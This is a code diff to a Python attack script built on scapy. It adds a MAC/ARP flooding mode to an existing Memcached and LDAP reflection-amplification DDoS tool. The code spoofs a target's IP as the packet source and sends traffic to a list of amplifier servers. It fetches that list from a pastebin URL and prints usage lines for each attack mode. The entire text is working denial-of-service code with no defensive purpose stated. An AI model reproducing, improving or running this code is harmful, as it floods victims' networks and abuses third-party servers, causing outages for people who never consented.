@@ -1,8 +1,9 @@
 import pip
-#pip.main(['install', 'scapy.all'])
+#pip.main(['install', 'scapy'])
 #pip.main(['install', 'datetime'])
+#pip.main(['install', 'nmap'])
 from scapy.all import *
-import threading, sys, datetime, argparse, urllib2
+import threading, sys, datetime, argparse, urllib2, nmap
 print("""
 
                       :::!~!!!!!:.
@@ -30,10 +31,11 @@ $R@i.~~ !     :   ~$$$$$B$$en:``
 print(datetime.datetime.now())
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-A", help="1 - Memcrashed | 2 - LDAP")
+parser.add_argument("-A", help="1 - Memcrashed | 2 - LDAP | 3 - MAC Flodding")
 parser.add_argument("-T", help="Target")
+parser.add_argument("-P", default=40, help="Port")
 parser.add_argument("-S", help="File amplification")
-parser.add_argument("-P", default=40, help="Number of packages")
+parser.add_argument("-N", default=40, help="Number of packages")
 args = parser.parse_args()
 
 def sends(data, port):
@@ -41,9 +43,20 @@ def sends(data, port):
 	for servers in ampl.xreadlines(): 
 		servers = servers.rstrip('\r\n')
 		print(servers)
-		packet = send(IP( src=target, dst=servers)/UDP(dport=port)/Raw(load=data), count=int(powers))
+		packet = send(IP(dst=servers, src=target)/UDP(dport=port)/Raw(load=data), count=int(powers))
 
 
+def macflood(target):
+	sendp(Ether(src=RandMAC(), dst=target )/ARP( op=2, psrc="0.0.0.0", hwdst=target)/Padding(load="X"*18))
+
+
+print("""
+
+1. Memcrashed: -A 1 -T xx.xx.xx.xx -S bot.txt -P 40
+2. LDAP: -A 2 -T xx.xx.xx.xx -S bot.txt -P 40
+3. Mac-flood: -A 3 -T xx.xx.xx.xx 
+
+	""")
 req = urllib2.urlopen('https://pastebin.com/raw/eSCHTTVu')
 f = open('bot.txt', 'w')
 print('Bots are uploaded to the bot.txt file')
@@ -53,7 +66,7 @@ f.close()
 attack = args.A
 target = args.T
 server = args.S
-powers = args.P
+powers = args.N
 servers = ''
 
 data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
@@ -72,3 +85,5 @@ elif(attack == '1'):
 	sends(data, 11211)
 elif(attack == '2'):
 	sends(ldap, 31337)
+elif(attack == '3'):
+	macflood(target)
